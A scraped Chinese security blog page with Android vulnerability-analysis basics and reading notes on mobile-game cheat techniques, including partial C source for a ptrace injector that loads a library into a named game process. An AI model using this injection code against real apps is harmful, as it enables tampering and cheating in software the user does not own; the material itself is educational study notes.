<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://source.android.com/source/initializing#installing-required-packages-ubuntu-1204" target="_blank" rel="noopener">https://source.android.com/source/initializing#installing-required-packages-ubuntu-1204</a><br><a href="https://source.android.com/source/requirements#older-versions" target="_blank" rel="noopener">https://source.android.com/source/requirements#older-versions</a><br><a href="https://bbs.pediy.com/thread-218366.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-218366.htm</a><br><a href="https://bbs.pediy.com/thread-218513.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-218513.htm</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://eternalsakura13.com/2018/02/23/android1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="sakura">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sakuraのblog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/02/23/android1/" itemprop="url">Android漏洞分析</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-23T22:12:43+08:00">
                2018-02-23
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Android漏洞分析基础/" itemprop="url" rel="index">
                    <span itemprop="name">Android漏洞分析基础</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>漏洞分析是指在代码中迅速定位漏洞产生的位置（简称溯源），理解攻击原理，并根据漏洞类型、漏洞利用技术以及目标平台的漏洞缓解技术，准确评估该漏洞的利用方式和风险等级的过程。</p>
<h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><h2 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h2><p>通过漏洞公布平台手机漏洞的信息，信息包括：漏洞厂商、影响版本、漏洞描述、漏洞发现时间、漏洞公布的时间、漏洞的状态以及漏洞POC、漏洞patch等。这些信息中比较重要的是漏洞的POC和patch，但有时漏洞公布不全面可能不包括POC，只有通过漏洞描述展开分析。</p>
<table>
<thead>
<tr>
<th>漏洞信息</th>
<th style="text-align:right">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>漏洞厂商</td>
<td style="text-align:right">todo</td>
</tr>
<tr>
<td>影响版本</td>
<td style="text-align:right">todo</td>
</tr>
<tr>
<td>漏洞描述</td>
<td style="text-align:right">todo</td>
</tr>
<tr>
<td>发现时间</td>
<td style="text-align:right">todo</td>
</tr>
<tr>
<td>公布时间</td>
<td style="text-align:right">todo</td>
</tr>
<tr>
<td>漏洞状态</td>
<td style="text-align:right">todo</td>
</tr>
<tr>
<td>漏洞POC</td>
<td style="text-align:right">todo</td>
</tr>
<tr>
<td>漏洞patch</td>
<td style="text-align:right">todo</td>
</tr>
</tbody>
</table>
<h2 id="溯源"><a href="#溯源" class="headerlink" title="溯源"></a>溯源</h2><p>正确的判断漏洞产生的根源是漏洞分析中最重要的一步,在溯源过程中要明确两个问题.</p>
<ul>
<li>漏洞的类型。对于Android系统这样庞大的代码体系，任何位置都有可能产生bug，但漏洞的类型就固定几种，典型漏洞类型包括：栈溢出、堆溢出、整型溢出、格式化字符串、双重释放（Double free）、释放重用（UAF）等。</li>
<li>漏洞的逻辑。通过一些技巧可以精确的定位漏洞产生的位置，但要更好的理解漏洞产生的根源，还是需要理解漏洞是如何被触发的，这就需要去了解漏洞所在的系统模块及其运作原理。<h3 id="溯源方式"><a href="#溯源方式" class="headerlink" title="溯源方式"></a>溯源方式</h3>通常溯源展开方式依据我们能拿到的漏洞信息，可以分为三种情况：</li>
<li>漏洞信息中提供了POC。此时需要部署实验环境，使用POC来重现漏洞攻击，并通过调试技术定位漏洞所在函数，进一步确定代码行数。</li>
<li>漏洞已经发布补丁。此时只需对照patch前后代码即可定位漏洞存在的代码位置。</li>
<li>只有漏洞描述。<h3 id="调试方式"><a href="#调试方式" class="headerlink" title="调试方式"></a>调试方式</h3>扎实的调试技术是定位漏洞和利用漏洞的基础。<br>在定位漏洞时，通常触发漏洞后，看到的是系统崩溃或者是更加隐秘的程序逻辑错误，不管哪种都说明程序偏离了原本的执行流程，我们可以借助调试技术来观察系统崩溃状态重要的寄存器、内存的值和状态，并根据反汇编代码逐步回溯找到根源。同时也可以通过函数调用栈回溯函数调用过程，了解漏洞执行过程，各个函数的参数值，能够找到触发漏洞的异常输入，并通过分析异常输出和正常输入，这样可以为理解错误原因提供帮助。<br>在利用漏洞时，调试技术可以帮助我们调试利用代码，辅助适配各个机型等。</li>
</ul>
<p>android系统包括应用层、框架层、Native层、内核层。调试也是按层展开。</p>
<ul>
<li>smali动态调试：使用smalidea+android studio</li>
<li>so库动态调试： <a href="http://eternalsakura13.com/2018/01/30/ali_re2/">http://eternalsakura13.com/2018/01/30/ali_re2/</a></li>
<li>android系统Java源码调试及c/c++源码调试：这个需要下载AOSP源码，然后自己编译才能调试，编译过程参考，<a href="http://eternalsakura13.com/2018/02/24/bianyi/">http://eternalsakura13.com/2018/02/24/bianyi/</a></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://eternalsakura13.com/2018/02/22/youxi/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="sakura">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sakuraのblog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/02/22/youxi/" itemprop="url">《游戏安全:手游安全技术入门》理论篇</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-22T10:42:35+08:00">
                2018-02-22
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/读书笔记/" itemprop="url" rel="index">
                    <span itemprop="name">读书笔记</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="1-12章"><a href="#1-12章" class="headerlink" title="1-12章"></a>1-12章</h1><p>因为我读这本书的初衷是研究native层的注入和hook技术，并不十分关注游戏外挂本身，而且我已经有一定的逆向经验，所以这部分我只是大致看了看外挂的种类和游戏漏洞的风险点。</p>
<h2 id="需要学习的语言"><a href="#需要学习的语言" class="headerlink" title="需要学习的语言"></a>需要学习的语言</h2><p>在逆向分析中主要掌握的是ARM、c、c++、oc，但是除此之外，android软件经常使用的java以及smali代码，还有U3D主逻辑使用的c#和IL代码，以及某些游戏会使用lua或py脚本来写主逻辑，遇到这些语言，只需要在遇到他们时能够读懂基本逻辑即可。</p>
<h2 id="外挂技术——静态修改"><a href="#外挂技术——静态修改" class="headerlink" title="外挂技术——静态修改"></a>外挂技术——静态修改</h2><p>如果已经了解游戏的关键逻辑代码的位置，就可以直接修改，针对不同的语言有不同的修改方式，如针对c#编写的逻辑，用ildasm反编译后，修改IL指令，然后通过ilasm编译成dll文件，替换原安装包中的即可。</p>
<h2 id="外挂技术——动态修改"><a href="#外挂技术——动态修改" class="headerlink" title="外挂技术——动态修改"></a>外挂技术——动态修改</h2><p>若游戏做了比较严格的完整性校验或签名校验，难以静态绕过，则可以考虑动态。</p>
<h2 id="漏洞的实现原理"><a href="#漏洞的实现原理" class="headerlink" title="漏洞的实现原理"></a>漏洞的实现原理</h2><ul>
<li>游戏逻辑漏洞<br>通过修改客户端的游戏来实现外挂功能，游戏逻辑漏洞与游戏网络交互关系密切，如果游戏的绝大部分逻辑在服务端实现，客户端只是同步结果，则这类强联网游戏的安全性较好。</li>
<li>游戏协议稳定型漏洞<br>协议稳定型漏洞是指构造畸形协议导致协议处理方在处理协议时出现崩溃的漏洞。<br>协议稳定型漏洞的挖掘过程实际上就是畸形协议的构造过程，而畸形协议字段的构造可考虑通过Fuzz工具的思想实现，对各类边缘值的测试。</li>
<li>游戏服务端校验疏忽型漏洞<br>本质上就是Web漏洞，服务端校验不严格。</li>
</ul>
<h2 id="手游的分类和风险点"><a href="#手游的分类和风险点" class="headerlink" title="手游的分类和风险点"></a>手游的分类和风险点</h2><p>99-104页</p>
<h1 id="13章-注入技术的实现原理"><a href="#13章-注入技术的实现原理" class="headerlink" title="13章 注入技术的实现原理"></a>13章 注入技术的实现原理</h1><h2 id="ptrace注入技术的实现"><a href="#ptrace注入技术的实现" class="headerlink" title="ptrace注入技术的实现"></a>ptrace注入技术的实现</h2><h3 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-22-033620.jpg" alt=""></p>
<h3 id="代码实例"><a href="#代码实例" class="headerlink" title="代码实例"></a>代码实例</h3><p>Android.mk<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">LOCAL_PATH := $(call my-dir)  </span><br><span class="line">  </span><br><span class="line">include $(CLEAR_VARS)  </span><br><span class="line">LOCAL_MODULE := inject   </span><br><span class="line">LOCAL_SRC_FILES := ptraceInject.c InjectModule.c shellcode.s</span><br><span class="line">  </span><br><span class="line">LOCAL_LDLIBS += -L$(SYSROOT)/usr/lib -llog  </span><br><span class="line">  </span><br><span class="line">include $(BUILD_EXECUTABLE)</span><br></pre></td></tr></table></figure></p>
<p>InjectModule.c<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/************************************************************</span></span><br><span class="line"><span class="comment">  FileName: InjectModule.c</span></span><br><span class="line"><span class="comment">  Description:       ptrace注入      </span></span><br><span class="line"><span class="comment">***********************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/user.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/ptrace.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;elf.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ptraceInject.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;utils/PrintLog.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">  Description:    通过进程名称定位到进程的PID</span></span><br><span class="line"><span class="comment">  Input:          process_name为要定位的进程名称</span></span><br><span class="line"><span class="comment">  Output:         无</span></span><br><span class="line"><span class="comment">  Return:         返回定位到的进程PID，若为-1，表示定位失败</span></span><br><span class="line"><span class="comment">  Others:         无</span></span><br><span class="line"><span class="comment">*************************************************/</span> </span><br><span class="line"><span class="keyword">pid_t</span> FindPidByProcessName(<span class="keyword">const</span> <span class="keyword">char</span> *process_name)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> ProcessDirID = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">pid_t</span> pid = <span class="number">-1</span>;</span><br><span class="line">	FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">char</span> filename[MAX_PATH] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">char</span> cmdline[MAX_PATH] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> * <span class="title">entry</span> = <span class="title">NULL</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ( process_name == <span class="literal">NULL</span> )</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">	DIR* dir = opendir( <span class="string">"/proc"</span> );</span><br><span class="line">	<span class="keyword">if</span> ( dir == <span class="literal">NULL</span> )</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>( (entry = readdir(dir)) != <span class="literal">NULL</span> )</span><br><span class="line">	&#123;</span><br><span class="line">		ProcessDirID = atoi( entry-&gt;d_name );</span><br><span class="line">		<span class="keyword">if</span> ( ProcessDirID != <span class="number">0</span> )</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">snprintf</span>(filename, MAX_PATH, <span class="string">"/proc/%d/cmdline"</span>, ProcessDirID);</span><br><span class="line">			fp = fopen( filename, <span class="string">"r"</span> );</span><br><span class="line">			<span class="keyword">if</span> ( fp )</span><br><span class="line">			&#123;</span><br><span class="line">				fgets(cmdline, <span class="keyword">sizeof</span>(cmdline), fp);</span><br><span class="line">				fclose(fp);</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (<span class="built_in">strncmp</span>(process_name, cmdline, <span class="built_in">strlen</span>(process_name)) == <span class="number">0</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					pid = ProcessDirID;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	closedir(dir);</span><br><span class="line">	<span class="keyword">return</span> pid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> InjectModuleName[MAX_PATH] = <span class="string">"/data/libInjectModule.so"</span>;    <span class="comment">// 注入模块全路径</span></span><br><span class="line">	<span class="keyword">char</span> RemoteCallFunc[MAX_PATH] = <span class="string">"Inject_entry"</span>;              <span class="comment">// 注入模块后调用模块函数名称</span></span><br><span class="line">	<span class="keyword">char</span> InjectProcessName[MAX_PATH] = <span class="string">"com.yiyou.org.mario.xyhy"</span>;                      <span class="comment">// 注入进程名称</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 当前设备环境判断</span></span><br><span class="line">	<span class="meta">#<span class="meta-keyword">if</span> defined(__i386__)  </span></span><br><span class="line">	LOGD(<span class="string">"Current Environment x86"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	<span class="meta">#<span class="meta-keyword">elif</span> defined(__arm__)</span></span><br><span class="line">	LOGD(<span class="string">"Current Environment ARM"</span>);</span><br><span class="line">	<span class="meta">#<span class="meta-keyword">else</span>     </span></span><br><span class="line">	LOGD(<span class="string">"other Environment"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	<span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">pid_t</span> pid = FindPidByProcessName(InjectProcessName);</span><br><span class="line">	<span class="keyword">if</span> (pid == <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Get Pid Failed"</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;	</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"begin inject process, RemoteProcess pid:%d, InjectModuleName:%s, RemoteCallFunc:%s\n"</span>, pid, InjectModuleName, RemoteCallFunc);</span><br><span class="line">	<span class="keyword">int</span> iRet = inject_remote_process(pid,  InjectModuleName, RemoteCallFunc,  <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="comment">//int iRet = inject_remote_process_shellcode(pid,  InjectModuleName, RemoteCallFunc,  NULL, 0);</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (iRet == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Inject Success\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Inject Failed\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"end inject,%d\n"</span>, pid);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>ptraceInject.h<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/************************************************************</span></span><br><span class="line"><span class="comment">  FileName: ptraceInject.h</span></span><br><span class="line"><span class="comment">  Description:       ptrace注入      </span></span><br><span class="line"><span class="comment">***********************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;    </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;       </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;    </span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  MAX_PATH 0x100</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inject_remote_process</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">char</span> *LibPath, <span class="keyword">char</span> *FunctionName, <span class="keyword">long</span> *FuncParameter, <span class="keyword">long</span> NumParameter)</span></span>;   <span class="comment">// 通过ptrace远程调用dlopen/dlsym方式注入模块到远程进程</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inject_remote_process_shellcode</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">char</span> *LibPath, <span class="keyword">char</span> *FunctionName, <span class="keyword">long</span> *FuncParameter, <span class="keyword">long</span> NumParameter)</span></span>; <span class="comment">// 通过shellcode方式注入模块到远程进程</span></span><br></pre></td></tr></table></figure></p>
<p>ptraceInject.c<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span 